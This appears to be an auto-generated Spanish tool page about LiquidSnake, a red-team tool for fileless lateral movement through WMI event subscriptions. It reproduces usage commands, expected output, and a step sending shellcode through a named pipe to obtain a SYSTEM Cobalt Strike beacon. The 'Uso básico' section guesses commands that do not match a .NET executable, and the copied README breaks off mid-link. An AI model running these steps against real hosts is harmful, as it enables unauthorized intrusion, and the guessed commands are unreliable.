---
title: "Liquid Snake: LiquidSnake is a tool that allows operators to perform fileless lateral movement"
slug: "liquid-snake"
summary: "LiquidSnake is a tool that allows operators to perform fileless lateral movement using WMI Event Subscriptions and GadgetToJScript"
category: "ciberseguridad"
level: "Intermedio"
reading: 6
tags: ['lateral-movement', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es Liquid Snake

Liquid Snake es una herramienta de seguridad ofensiva / red team. LiquidSnake is a tool that allows operators to perform fileless lateral movement using WMI Event Subscriptions and GadgetToJScript

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/RiccardoAncarani/LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake)
- **Sección del toolkit:** Lateral Movement 

## Objetivo y función

El objetivo principal de Liquid Snake es liquidsnake is a tool that allows operators to perform fileless lateral movement using wmi event subscriptions and gadgettojscript.

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

Usage of this project is straightforward, use `LiquidSnake.exe` agains a host where you have administrative access over as follows:

```
LiquidSnake.exe <host> [<username> <password> <domain>]
LiquidSnake.exe dc01.isengard.local
LiquidSnake.exe dc01.isengard.local saruman DeathToFrodo123 isengard.local
```

NOTE: Currently thers is a bug when you explicitly set user credentials, the tool will not work in that case. It is recommended to use `make_token` or any other impersonation mechanism instead.

If everything went fine, you should obtain an output similar as the following:

```
[*] Event filter created.
[*] Event consumer created.
[*] Subscription created, now sleeping
[*] Sending some DCOM love..
[*] Sleeping again... long day
```

The example above uses CobaltStrike's `execute-assembly` to launch LiquidSnake:

![](images/2021-08-31-16-42-30.png)

Meanwhile, in the remote host a new named pipe will be created with the following name:

```
\\.\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7
```

![](images/2021-08-31-16-43-15.png)

Then, using my `send_shellcode_via_pipe` [project from my BOFs](https://github.com/RiccardoAncarani/BOFs/tree/master/send_shellcode_via_pipe) you can send an arbitrary shellcode on the remote pipe that will be loaded and executed:

```
send_shellcode_via_pipe \\dc01\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7 beacon.bin 
```

![](images/2021-08-31-16-41-25.png)

If everything worked as expected, you should obtain a SYSTEM beacon:

![](images/2021-08-31-
...


## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/RiccardoAncarani/LiquidSnake
cd liquid-snake

# Revisar ayuda
./liquid-snake --help 2>/dev/null || python3 -m liquid_snake --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Esta herramienta está pensada para Windows, .NET o entornos de Active Directory. No se instala de forma nativa en Termux; úsala desde una máquina virtual, un contenedor o un laboratorio con Windows/Linux completo.

## Buenas prácticas y ética

Usa Liquid Snake únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/RiccardoAncarani/LiquidSnake
- Toolkit de origen: Red Teaming Toolkit
